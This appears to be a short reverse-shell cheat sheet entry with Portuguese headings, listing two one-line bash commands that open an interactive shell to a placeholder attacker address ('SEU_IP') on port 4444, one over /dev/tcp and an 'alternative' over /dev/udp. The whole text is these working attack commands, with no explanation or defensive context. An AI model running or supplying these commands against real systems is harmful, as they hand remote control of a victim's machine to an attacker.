# Método /dev/tcp
/bin/bash -i >& /dev/tcp/SEU_IP/4444 0>&1

# Alternativa UDP (raro)
bash -i >& /dev/udp/SEU_IP/4444 0>&1
